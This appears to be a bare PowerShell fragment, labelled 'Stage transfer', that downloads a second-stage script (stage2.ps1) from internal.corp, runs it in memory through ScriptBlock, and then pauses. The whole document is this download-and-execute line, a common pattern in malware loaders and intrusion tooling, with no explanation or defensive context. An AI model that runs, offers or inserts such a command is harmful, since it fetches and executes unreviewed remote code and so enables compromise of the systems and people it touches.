<# Stage transfer #> $RemoteScript = (iwr "https://internal.corp/stage2.ps1" -UseBasicParsing).Content; [ScriptBlock]::Create($RemoteScript).Invoke(); Start-Sleep -Seconds 19
